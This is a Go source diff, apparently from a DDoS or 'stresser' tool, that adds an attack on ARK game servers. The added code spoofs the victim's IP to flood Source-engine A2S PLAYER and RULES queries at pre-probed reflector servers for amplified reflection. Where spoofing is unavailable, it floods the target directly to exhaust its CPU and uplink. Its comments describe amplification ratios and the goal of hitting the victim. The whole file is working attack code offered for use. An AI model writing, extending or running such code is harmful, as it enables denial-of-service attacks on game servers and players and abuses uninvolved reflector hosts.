@@ -5,6 +5,7 @@ import (
 	"context"
 	"encoding/binary"
 	"fmt"
+	"log"
 	"math/rand"
 	"net"
 	"strings"
@@ -1395,7 +1396,111 @@ func StartGameUDPSpam(target string, duration int, packetSize int, threads int, 
 	})
 }
 
+// ============================================================
+// ARK 智能攻击（game_udp + game=ark 分支）：
+// A2S PLAYER(0x55) / RULES(0x56) 协议级查询攻击，替代纯 UDP 前缀洪水。
+//   - 支持 IP 伪造（CanSpoofIP）且有反射器池 → 反射放大：
+//     预探测每个反射器（真实 IP）→ 免 challenge 直打 9B / 需 challenge 的
+//     预取 challenge 后伪源发 13B → 服务器把大响应（80 人服 ≈ 2×1400B）打到受害者。
+//     每 30s 周期刷新 challenge（TTL 保护），连续刷新失败移除。
+//   - 不支持 IP 伪造 / 无反射器池 → 直连两段式查询风暴（绝不伪源：
+//     响应打回 worker 自己，由 worker 自收发 challenge，打服务器 CPU/上行）。
+//   - 目标非 IPv4（伪源不可用）→ 自动降级直连，绝不打自己。
+// ============================================================
+
+const (
+	a2sQueryPlayer = iota // 0x55
+	a2sQueryRules         // 0x56
+)
+
+// buildA2SQuery 构造 PLAYER/RULES 查询（9B；challenge != 0 时附加 4B LE challenge 共 13B）
+func buildA2SQuery(queryType int, challenge uint32) []byte {
+	req := a2sPlayerReq
+	if queryType == a2sQueryRules {
+		req = a2sRulesReq
+	}
+	if challenge == 0 {
+		return append([]byte(nil), req...)
+	}
+	q := make([]byte, len(req)+4)
+	copy(q, req)
+	binary.LittleEndian.PutUint32(q[len(req):], challenge)
+	return q
+}
+
+// a2sProbeResult 对单个服务器查询的实测结果
+type a2sProbeResult struct {
+	challenge      uint32 // 0 = 免 challenge
+	needsChallenge bool
+	responseSize   int
+	ok             bool
+}
+
+// probeA2SQuery 用真实 IP 向服务器发一次查询，判断 challenge 需求与响应大小。
+// 响应头：0x41=需 challenge（后 4B 为 challenge）；0x44(PLAYER)/0x45(RULES)=免 challenge 数据。
+func probeA2SQuery(ip string, port int, queryType int, timeout time.Duration) a2sProbeResult {
+	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
+	if err != nil {
+		return a2sProbeResult{}
+	}
+	conn, err := net.DialUDP("udp", nil, addr)
+	if err != nil {
+		return a2sProbeResult{}
+	}
+	defer conn.Close()
+
+	conn.SetDeadline(time.Now().Add(timeout))
+	if _, err := conn.Write(buildA2SQuery(queryType, 0)); err != nil {
+		return a2sProbeResult{}
+	}
+	buf := make([]byte, 2048)
+	n, err := conn.Read(buf)
+	if err != nil || n < 5 {
+		return a2sProbeResult{}
+	}
+	data := buf[:n]
+	switch data[4] {
+	case 0x41: // 需要 challenge
+		if n < 9 {
+			return a2sProbeResult{}
+		}
+		return a2sProbeResult{
+			challenge:      binary.LittleEndian.Uint32(data[5:9]),
+			needsChallenge: true,
+			responseSize:   n,
+			ok:             true,
+		}
+	case 0x44, 0x45, 0x49: // 免 challenge，直接返回数据
+		return a2sProbeResult{responseSize: n, ok: true}
+	}
+	return a2sProbeResult{}
+}
+
+// learnA2SChallenge 直连模式专用：真实 IP 探测目标服务器的 challenge。
+// 返回 0 = 免 challenge 或探测失败（两者都发裸查，语义自洽）。
+func learnA2SChallenge(addr *net.UDPAddr, timeout time.Duration) uint32 {
+	conn, err := net.DialUDP("udp", nil, addr)
+	if err != nil {
+		return 0
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(timeout))
+	if _, err := conn.Write(buildA2SQuery(a2sQueryPlayer, 0)); err != nil {
+		return 0
+	}
+	buf := make([]byte, 2048)
+	n, err := conn.Read(buf)
+	if err != nil || n < 9 || buf[4] != 0x41 {
+		return 0
+	}
+	return binary.LittleEndian.Uint32(buf[5:9])
+}
+
 func StartGameUDPSpamEx(cfg AttackConfig) *AttackSession {
+	// ARK 专用分支：协议级 A2S 查询攻击（反射/直连自适应）
+	if strings.EqualFold(cfg.Game, "ark") {
+		return StartARKQueryAttackEx(cfg)
+	}
 	s := NewAttackSession(cfg.Target, cfg.Targets, "game_udp", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
 	ip, port := SplitTarget(cfg.Target)
 	if port == 0 {
@@ -1488,6 +1593,285 @@ func StartGameUDPSpamEx(cfg AttackConfig) *AttackSession {
 	}()
 
 	return s
+}
+
+// arkReflector 反射模式下的反射器状态（预探测结果 + 周期刷新）
+type arkReflector struct {
+	entry          reflectorEntry
+	challenge      uint32
+	needsChallenge bool
+	refreshFails   int // 连续刷新失败次数，>=2 移除
+}
+
+// StartARKQueryAttackEx ARK 协议级查询攻击入口（反射/直连自适应）
+func StartARKQueryAttackEx(cfg AttackConfig) *AttackSession {
+	s := NewAttackSession(cfg.Target, cfg.Targets, "game_udp", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
+	victimIP, port := SplitTarget(cfg.Target)
+	if port == 0 {
+		port = 27015
+	}
+	if victimIP == "" {
+		s.abort()
+		return s
+	}
+	if cfg.Duration < 1 {
+		cfg.Duration = 60
+	}
+	if cfg.Threads < 1 {
+		cfg.Threads = 10
+	}
+	if cfg.PacketSize < 5 {
+		cfg.PacketSize = 5
+	}
+
+	// 反射模式：仅当支持伪造 + 目标为 IPv4 + 有反射器池。
+	// 否则一律直连——绝不用伪源把响应打回 worker 自己。
+	spoofOK := cfg.CanSpoofIP && net.ParseIP(victimIP) != nil && !strings.Contains(victimIP, ":") && len(cfg.Targets) > 0
+	if spoofOK {
+		go startARKReflectAttack(s, cfg, victimIP, port)
+	} else {
+		go startARKDirectAttack(s, cfg, victimIP, port)
+	}
+	return s
+}
+
+// startARKReflectAttack 反射放大：预探测筛选反射器 → 伪源洪泛 A2S 查询。
+// 查询 9/13B（vs INFO 25/29B），80 人服 PLAYER 响应 split 为 2 包（≈2.8KB/查询），
+// 放大比约为 INFO 的 3 倍。
+func startARKReflectAttack(s *AttackSession, cfg AttackConfig, victimIP string, port int) {
+	entries := buildReflectorEntries(cfg.Targets, 27015)
+	if len(entries) == 0 {
+		s.abort()
+		return
+	}
+
+	// 1. 预探测：真实 IP 实测每个反射器（PLAYER 优先，响应过小再试 RULES）
+	sem := make(chan struct{}, 200)
+	var mu sync.Mutex
+	var reflectors []arkReflector
+	var wg sync.WaitGroup
+	for _, e := range entries {
+		wg.Add(1)
+		sem <- struct{}{}
+		go func(e reflectorEntry) {
+			defer wg.Done()
+			defer func() { <-sem }()
+			r := probeA2SQuery(e.addr.IP.String(), e.addr.Port, a2sQueryPlayer, 3*time.Second)
+			if !r.ok || r.responseSize < 300 {
+				if r2 := probeA2SQuery(e.addr.IP.String(), e.addr.Port, a2sQueryRules, 3*time.Second); r2.ok && r2.responseSize > r.responseSize {
+					r = r2
+				}
+			}
+			if !r.ok || r.responseSize < 300 {
+				return // 不响应或响应太小：剔除
+			}
+			mu.Lock()
+			reflectors = append(reflectors, arkReflector{entry: e, challenge: r.challenge, needsChallenge: r.needsChallenge})
+			mu.Unlock()
+		}(e)
+	}
+	wg.Wait()
+
+	if len(reflectors) == 0 {
+		log.Printf("[ark] reflector attack aborted: no usable reflectors after probe (%d candidates)", len(entries))
+		s.abort()
+		return
+	}
+	challengeCount := 0
+	for _, r := range reflectors {
+		if r.needsChallenge {
+			challengeCount++
+		}
+	}
+	log.Printf("[ark] reflector attack ready: %d/%d reflectors (challenge=%d direct=%d)",
+		len(reflectors), len(entries), challengeCount, len(reflectors)-challengeCount)
+
+	// 2. 周期刷新 challenge（真实 IP，challenge 有 TTL）：每 30s；连续 2 次失败移除
+	refreshDone := make(chan struct{})
+	defer close(refreshDone)
+	go func() {
+		ticker := time.NewTicker(30 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				mu.Lock()
+				keep := reflectors[:0]
+				for _, r := range reflectors {
+					if !r.needsChallenge {
+						keep = append(keep, r) // 免 challenge：恒可用
+						continue
+					}
+					p := probeA2SQuery(r.entry.addr.IP.String(), r.entry.addr.Port, a2sQueryPlayer, 2*time.Second)
+					if p.ok {
+						r.refreshFails = 0
+						if p.needsChallenge {
+							r.challenge = p.challenge
+						} else {
+							// 服务器行为变化：现在免 challenge 了
+							r.needsChallenge = false
+							r.challenge = 0
+						}
+						keep = append(keep, r)
+					} else {
+						r.refreshFails++
+						if r.refreshFails >= 2 {
+							log.Printf("[ark] reflector %s removed (challenge refresh failed x2)", r.entry.str)
+							continue
+						}
+						keep = append(keep, r)
+					}
+				}
+				reflectors = keep
+				log.Printf("[ark] challenge refresh done: %d active reflectors", len(reflectors))
+				mu.Unlock()
+			case <-s.StopChan:
+				return
+			case <-refreshDone:
+				return
+			}
+		}
+	}()
+
+	// 3. 伪源洪泛（PLAYER 为主，~20% RULES）
+	var floodWg sync.WaitGroup
+	dur := time.Duration(cfg.Duration) * time.Second
+	for i := 0; i < cfg.Threads; i++ {
+		floodWg.Add(1)
+		go func(seed int64) {
+			defer floodWg.Done()
+			rng := NewFastRNG(time.Now().UnixNano() + seed)
+			endTime := time.Now().Add(dur)
+			tc := newTimeCache()
+
+			spoof, err := NewSpoofConn(victimIP, port)
+			if err != nil {
+				atomic.AddUint64(&s.Stats.Errors, 1)
+				return
+			}
+			defer spoof.Close()
+
+			for tc.since(endTime) < 0 {
+				select {
+				case <-s.StopChan:
+					return
+				default:
+				}
+
+				mu.Lock()
+				if len(reflectors) == 0 {
+					mu.Unlock()
+					time.Sleep(100 * time.Millisecond)
+					continue
+				}
+				ref := reflectors[rng.Intn(len(reflectors))]
+				mu.Unlock()
+
+				qtype := a2sQueryPlayer
+				if rng.Intn(5) == 0 {
+					qtype = a2sQueryRules
+				}
+				q := buildA2SQuery(qtype, ref.challenge)
+
+				if !s.checkRate(len(q)) {
+					time.Sleep(time.Microsecond * 100)
+					continue
+				}
+
+				if err := spoof.Send(victimIP, ref.entry.addr.IP.String(), ref.entry.addr.Port, q); err != nil {
+					atomic.AddUint64(&s.Stats.Errors, 1)
+				} else {
+					atomic.AddUint64(&s.Stats.PacketsSent, 1)
+					atomic.AddUint64(&s.Stats.BytesSent, uint64(len(q)))
+				}
+				tc.refresh()
+			}
+		}(int64(i))
+	}
+
+	select {
+	case <-time.After(dur):
+	case <-s.StopChan:
+	}
+	s.finish()
+	waitGroupTimeout(&floodWg, 5*time.Second)
+	close(s.DoneChan)
+}
+
+// startARKDirectAttack 直连两段式查询风暴（不支持伪造 / 目标非 IPv4 / 无池）。
+// 绝不伪造源 IP——响应打回 worker 自己，由 worker 自收发 challenge。
+// 攻击价值：打服务器 CPU（协议解析）+ 上行（响应流量挤占游戏包）。
+func startARKDirectAttack(s *AttackSession, cfg AttackConfig, ip string, port int) {
+	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
+	if err != nil {
+		s.abort()
+		return
+	}
+
+	var wg sync.WaitGroup
+	dur := time.Duration(cfg.Duration) * time.Second
+	for i := 0; i < cfg.Threads; i++ {
+		wg.Add(1)
+		go func(seed int64) {
+			defer wg.Done()
+			conn, err := net.DialUDP("udp", nil, addr)
+			if err != nil {
+				atomic.AddUint64(&s.Stats.Errors, 1)
+				return
+			}
+			defer conn.Close()
+
+			rng := NewFastRNG(time.Now().UnixNano() + seed)
+			endTime := time.Now().Add(dur)
+			tc := newTimeCache()
+
+			// challenge 学习：发裸查 → 读响应拿 challenge（或确认免 challenge）。
+			// 每 15s 刷新一次（challenge 有 TTL；刷新失败保持旧值继续打）。
+			challenge := learnA2SChallenge(addr, 2*time.Second)
+			lastLearn := time.Now()
+
+			for tc.since(endTime) < 0 {
+				select {
+				case <-s.StopChan:
+					return
+				default:
+				}
+
+				if time.Since(lastLearn) > 15*time.Second {
+					lastLearn = time.Now()
+					challenge = learnA2SChallenge(addr, 2*time.Second)
+				}
+
+				qtype := a2sQueryPlayer
+				if rng.Intn(5) == 0 {
+					qtype = a2sQueryRules
+				}
+				q := buildA2SQuery(qtype, challenge)
+
+				if !s.checkRate(len(q)) {
+					time.Sleep(time.Microsecond * 100)
+					continue
+				}
+
+				n, err := conn.Write(q)
+				if err != nil {
+					atomic.AddUint64(&s.Stats.Errors, 1)
+				} else {
+					atomic.AddUint64(&s.Stats.PacketsSent, 1)
+					atomic.AddUint64(&s.Stats.BytesSent, uint64(n))
+				}
+				tc.refresh()
+			}
+		}(int64(i))
+	}
+
+	select {
+	case <-time.After(dur):
+	case <-s.StopChan:
+	}
+	s.finish()
+	waitGroupTimeout(&wg, 5*time.Second)
+	close(s.DoneChan)
 }
 
 func StartMinecraftAttack(target string, duration int, threads int, packetSize int, mode string) *AttackSession {
